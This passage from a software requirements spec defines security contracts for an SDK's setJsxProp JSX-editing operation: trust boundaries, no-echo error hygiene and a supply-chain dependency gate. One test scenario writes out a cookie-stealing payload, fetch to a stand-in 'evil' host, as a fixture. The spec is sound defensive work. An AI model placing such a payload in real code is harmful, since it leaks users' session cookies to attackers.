- GIVEN `setJsxProp("Button", "data-x", "{")` — an unbalanced initializer
- WHEN flushed
- THEN the `{` is emitted verbatim into the attribute position — the op performs no output
  re-validation; responsibility sits with the author (REQ-RXD-12)

### REQ-RXD-12: Trust boundary — `value` is a trusted-code channel (NEW, V2, first-class)

`setJsxProp`'s `value` is emitted verbatim as the attribute's expression/string initializer.
The SDK performs no validation, escaping, or sanitisation on `value`; it becomes executable
code in the generated file. The author is solely responsible for ensuring `value` is not
derived from untrusted input (e.g. schema `options`, CLI answers, network data) without the
author's own sanitisation. This mirrors the existing `.modify(fn)` and `addFunction(source)`
latitude. By contrast, `elementName` and `propName` are validated name arguments and are NOT a
trusted-code channel. This trust split MUST appear in the shipped docs (REQ-RXD-09.3) and in
`setJsxProp`'s own JSDoc.

(Previously: V1 stated this inside REQ-RXD-06's body as a paragraph. V2 promotes it to a
first-class requirement with the council-ratified wording, and splits the conflated V1
injection scenario into REQ-RXD-06.1 — hostile propName REJECTED — and REQ-RXD-12.1 below —
hostile value EMITTED — two opposite assertions one checkbox previously blurred.)

#### Scenario REQ-RXD-12.1: hostile expression as VALUE is emitted verbatim by contract (SEC-8)

- GIVEN `setJsxProp("Button", "onError", '{fetch("//evil/"+cookie)}')` — the injection-shaped
  payload in the VALUE position
- WHEN flushed
- THEN it SUCCEEDS and the printed output contains the payload VERBATIM as `onError`'s
  initializer — pinning the contract side of the trust split (its rejection twin is
  REQ-RXD-06.1, same payload in the propName position)

### REQ-RXD-13: Rejection-surface hygiene — no-echo tails, zero-emit, byte-unchanged (NEW, V2)

EVERY rejection this dialect mints (name-validator rejects REQ-RXD-06, match-count rejects
REQ-RXD-04, extension-gate rejects REQ-RXD-02) MUST satisfy, jointly:

- **Zero-emit**: zero directives are emitted for the run and the target file's content is
  byte-unchanged — a validate-then-mutate-anyway mutant dies against this; throw-only
  assertions do not kill it.
- **No-echo tails (name validators)**: the `dialectError` tail names the offending ARGUMENT
  (e.g. `propName`) and the RULE it broke — it MUST NOT interpolate the rejected value
  unbounded. If a fragment of the value is included for diagnosis, it is capped at ≤16
  characters and appears nowhere else on the error surface (asymmetry precedent: key/argument
  NAMES may appear; VALUES never do). The full-echo pattern of the TypeScript dialect's
  `assertNoCollision` message MUST NOT be copied onto these rejection paths.
- **Bounded path echo (extension gate)**: REQ-RXD-02's messages MAY echo the offending path —
  paths are not payloads — bounded, consistent with existing dialect messages.

The canary harness `test/security/canary-no-echo.test.ts` (`surfaceContains`) is the
enforcement vehicle for the no-echo property.

#### Scenario REQ-RXD-13.1: canary payload never surfaces on the rejection path (SEC-7)

- GIVEN a name-validator reject triggered with a hostile value containing a unique canary
  string (≥24 chars, so no ≤16-char diagnostic fragment can contain it)
- WHEN the rejection error is captured and swept via `surfaceContains` (message, all own
  properties, `.cause`, stack)
- THEN the canary appears NOWHERE on the error surface

#### Scenario REQ-RXD-13.2: every reject path is zero-emit and byte-unchanged

- GIVEN one representative reject from EACH path — validator (REQ-RXD-06), zero-match and
  multi-match (REQ-RXD-04), extension gate (REQ-RXD-02, in-run form)
- WHEN each run settles
- THEN each emits ZERO directives and a subsequent read shows the target file byte-unchanged

#### Scenario REQ-RXD-13.3: tail names argument and rule, never the unbounded value

- GIVEN a propName validator reject with a 100-char hostile value
- WHEN the error message is inspected
- THEN it names `propName` and the grammar rule; the full 100-char value does NOT appear (any
  diagnostic fragment is ≤16 chars)

### REQ-RXD-14: Supply-chain gate — spike dependencies never ship (NEW, V2)

The exploration spike installed `@babel/parser`, `@babel/generator`, `recast`, and
`magic-string` in a scratchpad. NONE of these MAY appear in the shipped `package.json`
(dependencies, devDependencies, or any other field) or the committed lockfile. The package's
runtime `dependencies` MUST remain exactly `{ "ts-morph": <exact-pin> }` — this change adds
ZERO dependencies (FIT-14's baseline pin is the standing enforcement).

#### Scenario REQ-RXD-14.1: spike libraries absent from manifest and lockfile

- GIVEN the shipped `package.json` and committed lockfile after this change
- WHEN scanned for `@babel/parser`, `@babel/generator`, `recast`, `magic-string`
- THEN zero matches — and `dependencies` still equals exactly the single exact-pinned
  `ts-morph` entry

## Sensitive Areas Coverage

| Area | REQ IDs | Flagged at triage? |
|---|---|---|
| security (code execution) — new `.modify()`-equivalent instance in a new AST realm, load-bearing name validators, trust boundary, rejection hygiene | REQ-RXD-01..07, REQ-RXD-10..13 | Yes |
| public-api (contract) — new `package.json#exports` subpath | REQ-RXD-01, REQ-RXD-02 | Yes (corroborating) |
| security (supply-chain) — spike-dependency gate | REQ-RXD-14 | Yes |

## Open Flags for Design

- **`setJsxProp` fidelity + validator-load-bearing spike-gate (BLOCKING obligation, extended
  V2)**: before apply, design MUST run the de-risk spike (reusing the scratchpad harness)
  proving (a) `JsxAttribute` set/add byte-exactness across the corpus under real mutation
  (REQ-RXD-08.2), AND (b) empirically that an UNVALIDATED propName splices RAW into the
  printed source — demonstrating the validator is load-bearing, not assumed
  belt-and-suspenders (council ruling on ts-morph's raw-text structure writes).
- **Duplicate-vs-shared ops / fidelity-glue hoist**: unchanged from V1 — ops axis duplicate;
  fidelity-glue primitives lean hoist to `src/core/**`, fallback duplicate+followup.
  `architecture_impact` posture handed to design (`modifying` under hoist; `additive` under
  fallback).
- **Spread-supplied prop collision**: REQ-RXD-04/10 pin attribute-list matching and
  after-spread insertion; whether a `{...spread}` might already supply `propName` is
  unknowable statically — v1's contract is positional precedence (REQ-RXD-10.2) + doc warning
  (REQ-RXD-09.3), not detection. Design owns any diagnostic beyond that.
- **Validator module home**: REQ-RXD-06 pins behaviour (grammars, per-arg application,
  pre-mutation timing, denylist), never the module's file path. Design owns placement
  (core-resident per proposal's intent).

## Notes for sdd-archive (followup ledger additions — join the proposal's Archive Commitments)

- **TS-dialect trust-boundary JSDoc backfill**: the shipped TypeScript dialect's splice-arg ops
  (`addFunction`/`addVariable`/`addClass` `source`/`initializer` args) carry no trust note in
  their JSDoc — backfill REQ-RXD-12-equivalent wording (security council finding; distinct from
  pending item 22's validator retrofit).
- **Default/mixed-import support**: named-only limitation (REQ-RXD-05.4) → React op-catalog
  follow-up is its home.
- **`.jsx` extension support — ALREADY REGISTERED in `openspec/pending-changes.md`**
  (owner-requested, added mid-plan 2026-07-16, before build). Do NOT register a second row;
  when the React op-catalog groups are created at archive, fold the existing `.jsx` row into
  the catalog plan or re-affirm it standalone — never duplicate, never orphan.
